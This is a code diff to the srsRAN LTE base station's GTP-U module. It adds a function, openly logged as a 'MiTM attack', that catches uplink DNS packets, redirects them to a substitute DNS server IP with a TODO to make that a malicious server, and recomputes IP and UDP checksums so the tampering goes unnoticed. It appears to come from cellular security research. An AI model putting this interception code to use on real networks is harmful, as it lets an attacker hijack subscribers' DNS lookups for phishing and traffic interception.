@@ -27,6 +27,7 @@
 #include "srsran/interfaces/enb_interfaces.h"
 #include "srsran/interfaces/enb_pdcp_interfaces.h"
 #include "srsran/support/srsran_assert.h"
+#include "srsran/common/dns.h"
 
 #include <errno.h>
 #include <linux/ip.h>
@@ -447,6 +448,7 @@ void gtpu::write_pdu(uint16_t rnti, uint32_t eps_bearer_id, srsran::unique_byte_
   send_pdu_to_tunnel(tx_tun, std::move(pdu));
 }
 
+// [Matan] TX data to PDU
 void gtpu::send_pdu_to_tunnel(const gtpu_tunnel& tx_tun, srsran::unique_byte_buffer_t pdu, int pdcp_sn)
 {
   // Check valid IP version
@@ -455,6 +457,31 @@ void gtpu::send_pdu_to_tunnel(const gtpu_tunnel& tx_tun, srsran::unique_byte_buf
     logger.error("Invalid IP version to SPGW");
     return;
   }
+
+  // [Matan] Modify target DNS IP on the uplink packet
+  mitm_utils::packet p = mitm_utils::parse_packet(data);
+
+  struct in_addr src_ip_addr;
+  src_ip_addr.s_addr = p.ip->iph_sourceip;
+
+  if (std::string(inet_ntoa(src_ip_addr)) != "0.0.0.0" && (int)p.ip->iph_protocol == 17 && (int)(ntohs(p.udp->udph_destport)) == 53)
+    {
+        logger.debug("UL DNS packet received from PDCP SN[%d], performing MiTM attack!", pdcp_sn);
+
+        // MiTM attack
+        // TODO: command line defined malicious DNS server IP
+        std::string fake_dns_ip = "8.8.4.4";
+        logger.debug("Changing packet destination IP to [%s]", fake_dns_ip.c_str());
+        mitm_utils::set_dest_ip(&p, fake_dns_ip);
+
+        // Fix integrity checks
+        // For DNS, we need to fix IP and UDP checksums
+        logger.debug("Applying checksums [IP, UDP] to packet");
+        mitm_utils::compute_ip_checksum(&p);
+        mitm_utils::compute_udp_checksum(&p, pdu.length());
+
+        logger.debug("UL MiTM attack completed, forwarding packet");
+    }
 
   gtpu_header_t header;
   header.flags        = GTPU_FLAGS_VERSION_V1 | GTPU_FLAGS_GTP_PROTOCOL;
